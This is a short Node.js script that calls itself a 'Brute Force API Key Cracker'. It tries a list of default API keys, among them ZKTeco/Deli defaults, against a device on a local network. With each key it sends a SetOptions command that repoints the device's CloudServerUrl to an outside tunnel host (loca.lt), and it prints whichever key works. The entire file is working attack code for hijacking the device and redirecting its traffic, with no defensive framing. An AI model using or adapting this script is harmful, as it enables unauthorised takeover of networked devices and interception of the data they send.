const http = require('http');

console.log('--- Brute Force API Key Cracker ---');
console.log('Target: 192.168.1.3');

const NEW_URL = 'http://funny-cat-99.loca.lt';

// We know this command exists because it gave 403 (not unknown_command)
const targetCmd = 'SetOptions';
const targetKey = 'CloudServerUrl';

// Extensive list of common default keys
const apiKeys = [
    '',          // Empty
    '0',         // Common default
    '1234',      // Common default
    '888888',    // Deli / ZKTeco default
    '111111',
    '123456',
    'admin',
    'deli',
    'comkey',
    '000000',
    '5005',
    '999999'
];

async function tryKey(apiKey) {
    return new Promise((resolve) => {
        const data = JSON.stringify({
            "mid": Date.now().toString(),
            "cmd": targetCmd,
            "payload": { [targetKey]: NEW_URL }
        });

        const options = {
            hostname: '192.168.1.3',
            port: 80,
            path: '/control?api_key=' + encodeURIComponent(apiKey),
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': data.length
            },
            timeout: 3000
        };

        const req = http.request(options, (res) => {
            let body = '';
            res.on('data', d => body += d);
            res.on('end', () => resolve({ status: res.statusCode, body }));
        });

        req.on('error', e => resolve({ error: e.message }));
        req.write(data);
        req.end();
    });
}

async function run() {
    console.log(`Targeting Command: ${targetCmd}`);
    console.log(`Trying ${apiKeys.length} keys...`);

    for (const key of apiKeys) {
        process.stdout.write(`Testing Key: [${key}] ... `);

        const res = await tryKey(key);

        if (res.error) {
            console.log(`Error: ${res.error}`);
        } else {
            if (res.status === 200) {
                console.log(`\n!!! MATCH FOUND !!!`);
                console.log(`Valid API Key: "${key}"`);
                console.log(`Response: ${res.body}`);
                console.log(`(This key worked! Please use this key in the final script)`);
                return;
            } else if (res.status === 403) {
                console.log(`Failed (403)`);
            } else {
                console.log(`Status ${res.status}`);
            }
        }
    }
    console.log('\n--- Scan Complete ---');
    console.log('If no match found, the device might have a custom password set on the screen.');
}

run();
